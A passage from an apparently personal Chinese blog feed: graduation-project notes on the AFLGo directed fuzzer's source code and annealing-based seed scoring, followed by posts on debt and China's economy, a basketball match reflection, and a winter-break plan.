不明白为什么这个函数会调用run_taget</li><li>计算entry分数</li><li>看看是否要跳过<code>deterministic</code>变异阶段<ul><li>如果skip_deterministic设置为1、或者entry fuzzed或者entry-&gt;passed_det设置为1)</li><li>如果执行路径校验将其置于该主实例的范围之外，则跳过确定性模糊处理。</li></ul></li><li>按照以下阶段进行变异 <ul><li>simple bitflip</li><li>arithmetic</li><li>interst</li><li>dictionary</li><li>havoc</li><li>splice<blockquote><p>当然在这些变异阶段中, 大多都是每变异一次就进行<code>common_fuzz_stuff</code>。 还有很多为了保证程序效率(比如: 当变异出现的结果在之前的变异阶段已经被运行过的时候可以跳过、当对于某个字节的变异没有出现效果，那在以后的变异阶段就不会变异该字节了-相当于认为该字节对于提高程序效果没有太大的意义)<br>还有<code>common_fuzz_stuff</code>阶段产生出来的<em>新的变异enrty</em>会根据<code>save_if_interetring</code>函数来决定是否加入到队列中。加入队列的方式是<strong>尾插法！</strong>只不过把刚刚添加进队列的<code>entry</code>看作是<code>queue_top</code></p></blockquote></li></ul></li></ul><p>循环结束后，回对sync_fuzzer进行一个操作，这个可以后面再看。</p></li></ul><h4 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score()"></a>calculate_score()</h4><p>计算得分,跟得分有关的因素</p><ul><li><code>exec_us</code> 和<code>avg_execc_us</code>的大小关系, <code>exec_us</code>相对越小, 得分肯定就越高</li><li><code>bitmap_size</code>(发现的路径数) 和 <code>avg_bitmap_size</code>大小关系, <code>bitmap_size</code>相对越高, 得分越高</li><li><code>handicap</code> 某个<code>testcase</code>可能是在程序运行的末尾才发现, 然后被添加到队列中。而这个时候，队列中前面的<code>entry</code>很有可能已经运行了很多<code>cycle</code>. 所以，这部分<strong>后来添加到队列中</strong>的<code>entry</code>得分更高。</li><li><code>depth</code> 原文 <em>under the assumption that fuzzing deeper test cases is more likely to reveal stuff that can’t be discovered with traditional fuzzers.</em> <code>depth</code>的值越大，得分也就越高。也就是说, 一些变异的<code>entry</code>较大可能会是后面才添加进来的。所以假设越往后添加进来的越高。<strong>这个要跟上面的handicap相区别，depth反映的是队列中的entry数量, handicap是整体队列变异的cycle</strong></li><li><code>cooling_schedule</code> 基于距离的模拟退火算法, 距离越近的随着时间的推移, <code>power_factor</code>会越来越高. 相对应的得分也就越高. <code>perf_score *= power_factor</code> </li></ul><blockquote><p>具体的得分，跟确定性变异阶段的时间没有关系，得分越高，随机性变异阶段的时间也就越长。</p></blockquote><h4 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff()"></a>common_fuzz_stuff()</h4><p>把经过变异修改的文件重新写入testcase, 然后在进行<code>run_target()</code>。接着运行<code>save_if_interesting()</code>判断是否对变异的testcase进行统计或者其他操作</p><h4 id="run-target"><a href="#run-target" class="headerlink" title="run_target()"></a>run_target()</h4><ul><li>第一种情况: 独自运行exec, 等待子进程结束</li><li>第二种情况: 通过管道和forkserver通信，forkserver fork出一个子进程进行fuzz，将子进程的状态写入通道。 父进程再通过通道中的信息, 对程序状态进行返回。<strong>当然在子进程进行fuzz的过程中 trace_bits会发生更新</strong></li></ul><h5 id="C-知识"><a href="#C-知识" class="headerlink" title="C 知识"></a>C 知识</h5><h6 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h6><ul><li>WIFSIGNALED(status)为非0 表明进程异常终止 <strong>用来判断crash</strong></li><li>WIFSTOPPED(status)为非0 表明进程处于暂停状态 <strong>用来判断fork server是否正常进行, 此时因为fork server是处于循环当中，所以对应的状态是处于暂停。</strong></li><li>WTERMSIG(status) 获取程序退出的信号(比如:<code>SIGKILL</code>)</li></ul><h6 id="setitimer"><a href="#setitimer" class="headerlink" title="setitimer"></a>setitimer</h6><p>关于这个，详细的内容网上都有。 但是没搞清楚这个时间定时到底是阻塞的还是非阻塞的。？？</p><h4 id="save-if-interesting"><a href="#save-if-interesting" class="headerlink" title="save_if_interesting"></a>save_if_interesting</h4><p>看一下当前的testcase是否触发了新的路径, 如果触发了新的路径，需要把这个testcase添加到当前的队列里面。并且要在queue中以<code>(&quot;%s/queue/id:%06u,%llu,%s&quot;, out_dir, queued_paths, get_cur_time() - start_time ,describe_op(hnb))</code>这样的形式命名。</p><p>根据<code>run_target()</code>的返回值，处理timeout、crash、error的情况</p><h3 id="write-bitmap"><a href="#write-bitmap" class="headerlink" title="write_bitmap()"></a>write_bitmap()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>把当前共享内存中的bitmap写到文件中去</p><h3 id="write-stats-file-1"><a href="#write-stats-file-1" class="headerlink" title="write_stats_file()"></a>write_stats_file()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>更新状态文件中的数据</p><h3 id="stop-fuzzing"><a href="#stop-fuzzing" class="headerlink" title="stop_fuzzing:"></a>stop_fuzzing:</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>程序的终止是需要用户自己按下<code>ctrl+c</code> 循环不会自己退出</p><p>对占有的内存空间进行释放, 退出程序</p><h2 id="AFLgo命令行启动参数"><a href="#AFLgo命令行启动参数" class="headerlink" title="AFLgo命令行启动参数"></a>AFLgo命令行启动参数</h2><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>i</td><td>输入目录</td></tr><tr><td>o</td><td>输出目录</td></tr><tr><td>M</td><td>master sync ID</td></tr><tr><td>S</td><td>master sync ID</td></tr><tr><td>f</td><td>目标文件</td></tr><tr><td>x</td><td>字典目录</td></tr><tr><td>t</td><td>超时时间设定</td></tr><tr><td>m</td><td>内存限制</td></tr><tr><td>d</td><td>是否跳过确定性变异阶段</td></tr><tr><td>B</td><td>加载bitmap</td></tr><tr><td>C</td><td>Crash模式</td></tr><tr><td>T</td><td>banner</td></tr><tr><td>Q</td><td>QEMU模式</td></tr><tr><td>z</td><td>模拟退火算法选定</td></tr><tr><td>c</td><td>退火算法的运行时间</td></tr></tbody></table><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Required parameters:  <span class="token parameter variable">-i</span> <span class="token function">dir</span>        - input directory with <span class="token builtin class-name">test</span> cases  <span class="token parameter variable">-o</span> <span class="token function">dir</span>        - output directory <span class="token keyword">for</span> fuzzer findingsDirected fuzzing specific settings:  <span class="token parameter variable">-z</span> schedule   - temperature-based power schedules                  <span class="token punctuation">&#123;</span>exp, log, lin, quad<span class="token punctuation">&#125;</span> <span class="token punctuation">(</span>Default: exp<span class="token punctuation">)</span>  <span class="token parameter variable">-c</span> min        - <span class="token function">time</span> from start when SA enters exploitation                  <span class="token keyword">in</span> secs <span class="token punctuation">(</span>s<span class="token punctuation">)</span>, mins <span class="token punctuation">(</span>m<span class="token punctuation">)</span>, hrs <span class="token punctuation">(</span>h<span class="token punctuation">)</span>, or days <span class="token punctuation">(</span>d<span class="token punctuation">)</span>Execution control settings:  <span class="token parameter variable">-f</span> <span class="token function">file</span>       - location <span class="token builtin class-name">read</span> by the fuzzed program <span class="token punctuation">(</span>stdin<span class="token punctuation">)</span>  <span class="token parameter variable">-t</span> msec       - <span class="token function">timeout</span> <span class="token keyword">for</span> each run <span class="token punctuation">(</span>auto-scaled, <span class="token number">50</span>-1000 ms<span class="token punctuation">)</span>  <span class="token parameter variable">-m</span> megs       - memory limit <span class="token keyword">for</span> child process <span class="token punctuation">(</span><span class="token number">50</span> MB<span class="token punctuation">)</span>  <span class="token parameter variable">-Q</span>            - use binary-only instrumentation <span class="token punctuation">(</span>QEMU mode<span class="token punctuation">)</span>Fuzzing behavior settings:  <span class="token parameter variable">-d</span>            - quick <span class="token operator">&amp;</span> dirty mode <span class="token punctuation">(</span>skips deterministic steps<span class="token punctuation">)</span>  <span class="token parameter variable">-n</span>            - fuzz without instrumentation <span class="token punctuation">(</span>dumb mode<span class="token punctuation">)</span>  <span class="token parameter variable">-x</span> <span class="token function">dir</span>        - optional fuzzer dictionary <span class="token punctuation">(</span>see README<span class="token punctuation">)</span>Other stuff:  <span class="token parameter variable">-T</span> text       - text banner to show on the <span class="token function">screen</span>  <span class="token parameter variable">-M</span> / <span class="token parameter variable">-S</span> <span class="token function">id</span>    - distributed mode <span class="token punctuation">(</span>see parallel_fuzzing.txt<span class="token punctuation">)</span>  <span class="token parameter variable">-C</span>            - crash exploration mode <span class="token punctuation">(</span>the peruvian rabbit thing<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ul><li><p><strong>export</strong></p><p>为shell变量或函数设置导出属性。它们会成为环境变量, 可以在脚本中访问它们，尤其是脚本中调用的子进程需要时。</p></li><li><p><strong>echo</strong></p><p>echo命令 用于在shell中打印shell变量的值，或者直接输出指定的字符串。linux的echo命令，在shell编程中极为常用, 在终端下打印变量value的时候也是常常用到的，因此有必要了解下echo的用法echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。</p></li><li><p><strong>mkdir</strong></p><p>创建目录</p></li><li><p><strong>cat</strong></p><p>连接多个文件并打印到标准输出</p></li><li><p><strong>cut</strong></p><p>cut命令用来显示行中的指定部分，删除文件中指定字段。说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数 file 所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如cut fl f2 &gt; f3将把文件 fl 和 f2 的内容合并起来，然后通过输出重定向符“&gt;”的作用，将它们放入文件 f3 中。</p></li><li><p><strong>rev</strong></p><p>将文件内容以字符为单位反序输出—也就是每行的字符都到过来</p></li><li><p><strong>cp</strong></p><p>将源文件或目录复制到目标文件或目录中</p></li><li><p><strong>pushd&amp;&amp;popd</strong></p><p>倒可以简单地把这个命令理解为切换/再换回来目录的命令。</p></li><li><p><strong>chmod</strong></p><p>用来变更文件或目录的权限</p></li><li><p><strong>mv</strong></p><p>mv命令 用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ol><li><a href="http://rk700.github.io/2018/01/04/afl-mutations/">http://rk700.github.io/2018/01/04/afl-mutations/</a></li><li><a href="https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90">https://rk700.github.io/2017/12/28/afl-internals/#%E5%88%86%E6%94%AF%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%86%E6%9E%90</a></li><li><a href="https://paper.seebug.org/496/#_2">https://paper.seebug.org/496/#_2</a></li><li><a href="https://bbs.pediy.com/thread-265936.htm#msg_header_h1_2">https://bbs.pediy.com/thread-265936.htm#msg_header_h1_2</a>  </li><li><a href="https://paper.seebug.org/1732/#afl-afl-asc">https://paper.seebug.org/1732/#afl-afl-asc</a></li><li><a href="https://www.anquanke.com/post/id/250540#h2-5">https://www.anquanke.com/post/id/250540#h2-5</a></li><li><a href="https://linux.cmsblogs.cn/">https://linux.cmsblogs.cn/</a>    —-查询linux命令的网站</li></ol>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国政府与经济发展</title>
      <link href="/2022/01/20/zhong-guo-zheng-fu-yu-jing-ji-fa-zhan/"/>
      <url>/2022/01/20/zhong-guo-zheng-fu-yu-jing-ji-fa-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="中国政府与经济发展"><a href="#中国政府与经济发展" class="headerlink" title="中国政府与经济发展"></a>中国政府与经济发展</h1><p>探究中国经济的发展，不能割裂开政府的作用。因为在我国，政府不但影响蛋糕的分配，也参与蛋糕的生产。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220120193437.png" alt="财税与政府行为"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220123192820.png" alt="土地财政与土地金融"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="关于债务到底在中国经济发展中起到了什么作用？"><a href="#关于债务到底在中国经济发展中起到了什么作用？" class="headerlink" title="关于债务到底在中国经济发展中起到了什么作用？"></a>关于债务到底在中国经济发展中起到了什么作用？</h3><p>举个例子，假如说</p><ul><li>A用100买了B的某个产品</li><li>B用这100支付给了C作为孩子上学的学费</li><li>C又用100发给了A作为工资</li></ul><p>那在这个过程中，经济发展了吗？</p><p>再比如</p><ul><li>A用100买了B的某个产品</li><li>B用这100支付给了C, 因为B之前欠C 100</li><li>C又用100发给了A作为工资</li></ul><p>在这个过程中，流通的钱还是100, 但是B已经还清了自己的债务。那这个过程中经济发展了吗？</p><blockquote><p>我觉得从自己举出的这个例子中，并不是很能看出过程中是否有社会财富的积累。</p></blockquote><hr><p>关于债务在经济发展中的作用，我在知乎上找到了一个非常形象的描述。</p><p>作者的主页 <a href="https://www.zhihu.com/people/he-jia-lei-80">https://www.zhihu.com/people/he-jia-lei-80</a></p><p><strong>现代世界经济发展，主要是靠债务驱动，通过扩大信贷来扩大整个市场。</strong></p><p>怎么理解这句话呢？我们回过头看看贵金属货币时期，社会的经济规模直接取决于贵金属的总量，想想看，本来有一块地方，有丰富的资源，但因为没有足够的贵金属货币，所以只能晾在那，贵金属的开采量限制了经济的发展。</p><p>后来犹太人就发明了债务货币化，简单来讲就是以贵金属货币或贵金属本位纸币为锚，利用存款派生来撬动整个市场规模，我就直接拿现代的例子来解释说明吧：现在有个菜农，还有一个建筑师，菜农想要请建筑师建一个房子，需要100万元，但菜农没那么多钱于是找银行申请贷款，贷款了100万通过电子转账给建筑师，这时候银行并不需要真的用到100万的现金，只需要在账户上操作下，这时候建筑师的电子账户瞬间多了100万，于是他给菜农建了一套房子，而菜农接下来的30年时间为了还款，于是不停的种菜卖菜，而建筑师因为有了100万的收入于是每天都找菜农买菜（也是通过电子转账），30年过后，债务还清了。</p><p>而这债务从发生到消亡的过程，社会上多了一个价值100万的房子，跟总值100万的菜，总共200万的产值（GDP），数倍于债务本身的产值。</p><h4 id="经济发展"><a href="#经济发展" class="headerlink" title="经济发展"></a>经济发展</h4><p>就当代经济而言，发展的含义相当丰富复杂。发展总是与发达、与工业化、与现代化、与增长之间交替使用。 一般来说，经济发展包括三层含义：<br>1.经济量的增长，即一个国家或地区产品和劳务的增加，它构成了经济发展的物质基础；<br>2.经济结构的改进和优化，即一个国家或地区的技术结构、产业结构、收入分配结构、消费结构以及人口结构等经济结构的变化；<br>3.经济质量的改善和提高，即一个国家和地区经济效益的提高、经济稳定程度、卫生健康状况的改善、自然环境和生态平衡以及政治、文化和人的现代化进程。<br>经济发展是通过经济结构的改进和优化、经济质量的改善和提高达到经济量的增长。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220123200009.png" alt="图解GDP"></p>]]></content>
      
      
      <categories>
          
          <category> 财经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中国经济发展 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码阅读-4</title>
      <link href="/2022/01/19/bi-she-fuzz-aflgo-yuan-ma-yue-du-4/"/>
      <url>/2022/01/19/bi-she-fuzz-aflgo-yuan-ma-yue-du-4/</url>
      
        <content type="html"><![CDATA[<h1 id="毕设-Fuzz-AFLGo源码阅读-4"><a href="#毕设-Fuzz-AFLGo源码阅读-4" class="headerlink" title="毕设-Fuzz-AFLGo源码阅读-4"></a>毕设-Fuzz-AFLGo源码阅读-4</h1><h2 id="AFLGo在AFL的基础上的改进"><a href="#AFLGo在AFL的基础上的改进" class="headerlink" title="AFLGo在AFL的基础上的改进"></a>AFLGo在AFL的基础上的改进</h2><p>添加了模拟退火算法, 根据种子距离目标节点的距离来</p><h3 id="1-具体的距离目标taget的距离是怎么计算的"><a href="#1-具体的距离目标taget的距离是怎么计算的" class="headerlink" title="1. 具体的距离目标taget的距离是怎么计算的"></a>1. 具体的距离目标taget的距离是怎么计算的</h3><h3 id="2-模拟退火算法-是如何逐步退火？-amp-amp-是怎么挑选种子的？"><a href="#2-模拟退火算法-是如何逐步退火？-amp-amp-是怎么挑选种子的？" class="headerlink" title="2. 模拟退火算法, 是如何逐步退火？&amp;&amp; 是怎么挑选种子的？"></a>2. 模拟退火算法, 是如何逐步退火？&amp;&amp; 是怎么挑选种子的？</h3><p>AFL 的calculate_score函数是对 seed 进行打分，打分的分数决定对 seed fuzzing的时间长度，按照直觉来说，距离越近的 seed，有更大的概率能够到达目标点，则应该分配更多的时间给这些 seed。但是这样就会陷入上面所说的局部最优的困局里，于是 AFLGo 采用时间作为一个划分阶段的 metric，当 fuzzing 的时间在预定的时间内时，让时间较为公平的分配给每个 seed 上，当 fuzzing 时间超过了预定的时间后，时间就集中分配给哪些距离较近的 seed 上。这样可以在前期避免还未广泛探索就过度集中的局部最优的情况。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++"> u64 cur_ms &#x3D; get_cur_time(); u64 t &#x3D; (cur_ms - start_time) &#x2F; 1000;&#x2F;&#x2F; 计算当前运行时间 double progress_to_tx &#x3D; ((double) t) &#x2F; ((double) t_x * 60.0);&#x2F;&#x2F; 进度条，距离利用阶段的比例还有多少 double T; &#x2F;&#x2F;TODO Substitute functions of exp and log with faster bitwise operations on integers&#x2F;&#x2F; 这里根据fuzzing前的选项选择冷却时间的模型，是log函数，还是线性，还是指数等等 switch (cooling_schedule) &#123;   case SAN_EXP:     T &#x3D; 1.0 &#x2F; pow(20.0, progress_to_tx);     break;   case SAN_LOG:     &#x2F;&#x2F; alpha &#x3D; 2 and exp(19&#x2F;2) - 1 &#x3D; 13358.7268297     T &#x3D; 1.0 &#x2F; (1.0 + 2.0 * log(1.0 + progress_to_tx * 13358.7268297));     break;   case SAN_LIN:     T &#x3D; 1.0 &#x2F; (1.0 + 19.0 * progress_to_tx);     break;   case SAN_QUAD:     T &#x3D; 1.0 &#x2F; (1.0 + 19.0 * pow(progress_to_tx, 2));     break;   default:     PFATAL (&quot;Unkown Power Schedule for Directed Fuzzing&quot;); &#125; double power_factor &#x3D; 1.0; if (q-&gt;distance &gt; 0) &#123;    &#x2F;&#x2F; 首先归一化距离   double normalized_d &#x3D; 0; &#x2F;&#x2F; when &quot;max_distance &#x3D;&#x3D; min_distance&quot;, we set the normalized_d to 0 so that we can sufficiently explore those testcases whose distance &gt;&#x3D; 0.   if (max_distance !&#x3D; min_distance)     normalized_d &#x3D; (q-&gt;distance - min_distance) &#x2F; (max_distance - min_distance);   if (normalized_d &gt;&#x3D; 0) &#123;       double p &#x3D; (1.0 - normalized_d) * (1.0 - T) + 0.5 * T;&#x2F;&#x2F; 计算p值，由距离和时间共同决定       power_factor &#x3D; pow(2.0, 2.0 * (double) log2(MAX_FACTOR) * (p - 0.5));&#x2F;&#x2F; 最后根据p值计算得到factor，   &#125;&#x2F;&#x2F; else WARNF (&quot;Normalized distance negative: %f&quot;, normalized_d); &#125; perf_score *&#x3D; power_factor;&#x2F;&#x2F; 乘上factor得到最后的score<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>也就是说，得分score计算的公式是由距离和时间共同决定的，你要搞清楚，<strong>并不是每一次fuzz都会选择score分数最高的种子，而是分配更多的havoc时间给这样的seed</strong>。刚开始种子是比较公平的分配到每个seed，这类似–无差别探索阶段。后来，当预定的时间已过。距离较近的seed就会拥有更高的分数，从而在固定的时间段内占有更长时间的havoc，以增加到达taget的几率。</p></blockquote><h3 id="3-一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？"><a href="#3-一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？" class="headerlink" title="3. 一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？"></a>3. 一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？</h3><p>先看一下什么叫做控制流图</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207203351.png" alt="控制流图CFG(Control Flow Graph)"></p><p>这两个是从源码角度分析的</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207211040.png" alt="函数距离计算公式"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207211712.png" alt="BB-Distance距离计算公式"></p><blockquote><p>结合的地方<br>Also, for each basic block in control flow graph of current function, we collect all functions it calls using <code>BBcalls.txt</code>. Among these functions that have <code>cg_distance</code>, AFLGO get the minimum of these and set <code>bb_distance</code> to it.</p></blockquote><p>下面这两个估计是从论文角度分析的，那可能源码在实现上和论文有一定的区别。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207212823.png" alt="函数层面距离计算"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207212850.png" alt="基本块层面距离计算"></p><h3 id="4-我应该怎么设计我的算法？"><a href="#4-我应该怎么设计我的算法？" class="headerlink" title="4. 我应该怎么设计我的算法？"></a>4. 我应该怎么设计我的算法？</h3><p>四个阶段</p><p>基于距离的模拟退火算法</p><ul><li>无差别探索阶段 Undifferentiated Exploration</li><li>短路径优先阶段 Short Path Priority</li></ul><p>基于基本块距离的模拟退火算法</p><ul><li>长路径探索    Long Path Exploration</li><li>长路径优先    Long Path Priority</li></ul><ol><li>设置<code>bb_passed</code> 记录当前种子经过的基本块的数量</li><li>设置<code>is_longpathexploration</code> 当前这个种子是不是在长路径探索阶段被探索过</li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="calibrate-case-函数"><a href="#calibrate-case-函数" class="headerlink" title="calibrate_case 函数"></a>calibrate_case 函数</h3><p>里面 this calculates cur_distance这个看不懂啊，has_new_bits函数中包括了下面计算max_distance和min_distance的代码，为什么这里又再次包含了一遍。</p><h3 id="程序中所谓的seed到底是什么？"><a href="#程序中所谓的seed到底是什么？" class="headerlink" title="程序中所谓的seed到底是什么？"></a>程序中所谓的seed到底是什么？</h3><p><strong>是不同的测试文件</strong>，不是像你像的那样，从这个测试文件中读取内容然后再将一条条的内容进行测试</p><h3 id="为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？"><a href="#为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？" class="headerlink" title="为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？"></a>为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220221171732.png" alt="无法生成dot文件"></p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>Sudo 的全称为：super user do。 顾名思义：干超级用户才能干的事！所以Sudo最常用的功能就是提升一个命名的执行权限。</p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。跟任意其它类型容器一样，它能够存放各种类型的对象。可以简单的认为，向量是一个能够存放任意类型的动态数组。</p><h3 id="程序是如何保留debug信息的呢？"><a href="#程序是如何保留debug信息的呢？" class="headerlink" title="程序是如何保留debug信息的呢？"></a>程序是如何保留debug信息的呢？</h3>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OneToOne-1</title>
      <link href="/2022/01/06/onetoone-1/"/>
      <url>/2022/01/06/onetoone-1/</url>
      
        <content type="html"><![CDATA[<h1 id="OneToOne-1"><a href="#OneToOne-1" class="headerlink" title="OneToOne-1"></a>OneToOne-1</h1><p>比赛时间：2022/1/4</p><p>不知不觉，已经到了大四上学期结束的时候了。跟狗子的单挑也从大一持续到了现在。 这学期的单挑，真的是没赢过啊。确实是有机会赢，但是自己没有把握住。虽然自己矮十几厘米，但是我还算比较有韧性把。很多时候，我都会怀疑自己会输。可总是会咬牙坚持到最后。尤其是最近刚刚打过的这次。</p><p>5局3胜制，我开局以0比2落后。面对比自己高比自己壮的人，我很难不产生一种要服输的心理。三分真的算是我位数不多的得分手段了，如果三分球投不进，我真的很难赢。我不断在心里默默地给自己加油，鼓励自己坚持下去。果然，连续翻了2局。</p><p>最后一局，也是打到了10比10平(11分制)。首先的球权是在我手里，但是我没有把握住机会。不知道为什么，在习惯了以三分作为自己的得分手段之后，以前我非常擅长的中距离变得非常陌生。没办法判断到底什么时机是合适的出手机会。所以啊，还是要继续努力才行。生活中比较庆幸地也是有这样的朋友把，大家就不断互相进步。</p><p>其实把，想赢的心理在我心中一直都有。只不过，确实有的时候会动摇。你会怀疑自己到底能不能赢。就像在面对生活中的困难一样，我觉得正常的人可能都会质疑自己是否能挺过难关，是否能真正地坚持下去。但无疑，坚持下去大多时候会有一个比自己预期要好的结果。就像这次单挑一样，0比2落后，我真的怀疑自己了。但是我心里告诉自己，一定要坚持下去，没有结束，凭什么就这么服输，三分不可能一直投不进。</p><p>我经常会以这些看似鸡汤话鼓励一些在生活中过的不那么如意的人，<strong>有些人总是会说: 只不过是你运气好罢了。</strong> 我觉得他们说的很正确，之所以我有今天的价值观，无非是在我的经历中，坚持下去的做法带来了较多积极的效果。 即使是这样，我仍不觉得我鼓励别人积极乐观地生活是错的，因为我觉得，坚持下去的结果总比放弃的结果好。<strong>哪怕你这次说我没有站在你的角度上思考问题，下次我还是会这么鼓励你。</strong></p><p>回想一下，从刚上大学到现在，坚持练球的过程真的带给我很多生活中的道理。从习惯性一个人为了自己的目标努力，到不因为眼前的困难而放弃，到如何在别人的嘲笑下依旧坚持自己，再到学会把眼光放得长远。我不知道是不是每个打球的人都能体会到这些，但显然善于体味生活的人一定会从中得到很多属于自己的故事。</p><p><strong>我的高中班主任曾经说我打球的原因，就是想耍帅。</strong>但事实是，我经常性地自己练球。 也并没有因此获得什么可以拿的出手的成绩。 可这些并没有影响到我对于篮球的喜爱。 还是那句话，我不是为了打败谁，也不是想成为像NBA球星一样的人物。 我的目标很简单：就是完成自己给自己设定的目标，也许这个目标在有些人看来不值一提。 可是我相信，慢慢地努力，总会达到我想要的效果。现实也正是如此。</p><p>很幸运，我遇到了篮球。要真的追想的话，也不知道具体自己什么时间就喜欢上了篮球。那种不求任何结果，慢慢享受打球过程和眼看着自己慢慢进步的感觉真的很美妙。 可惜，我在我专业课程的学习上并没有这种劲头。 我也喜欢，但没有那种痴迷式的喜欢。 造成的结果也清楚， 我只是比一部分人做得好，但成为不了那种比绝大部分人做得好的人。 哪怕我自己清楚这一点， 还是跟篮球一样， 我不是为了要比谁强，比谁更优秀，我只是像完成自己对自己设定的目标。</p><hr><p>老早就想写这样的总结了，还是往后拖了几天…. 也不知道自己写了点啥， 反正就当给生活留个纪念吧</p>]]></content>
      
      
      <categories>
          
          <category> 篮球 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OneToOne </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大四上寒假计划</title>
      <link href="/2022/01/06/da-si-shang-han-jia-ji-hua/"/>
      <url>/2022/01/06/da-si-shang-han-jia-ji-hua/</url>
      
        <content type="html"><![CDATA[<p>寒假计划</p><ul><li><input checked="" disabled="" type="checkbox"> 力量训练–争取每一次都做到训练的标准，而不是消耗性的运动</li><li><input disabled="" type="checkbox"> 毕设一定要稳步推进</li><li><input disabled="" type="checkbox"> 学会做更多的菜，尝试去做蛋糕</li><li><input disabled="" type="checkbox"> 多跟着奶奶置办一些年货</li><li><input checked="" disabled="" type="checkbox"> 去走动亲戚，尤其是那种好几年都没回来过的。<strong>不要找一些冠冕堂皇的借口，其实你就是懒！</strong></li><li><input checked="" disabled="" type="checkbox"> 不要跟家里人生气，争取一次都不要</li><li><input checked="" disabled="" type="checkbox"> 再配一副眼镜，去体育公园打打球</li><li><input checked="" disabled="" type="checkbox"> 买到自己想要的新年衣服</li><li><input checked="" disabled="" type="checkbox"> 留意一下家里有没有什么合适的女朋友 😀~~~ (？！我劝你好自为之)</li></ul><p>暂时就是这些，希望寒假回来的时候，能都打上√</p><p>首先是毕设的问题，在自己家真的不是什么适合学习的地方, 但是也不能说啥也没看, 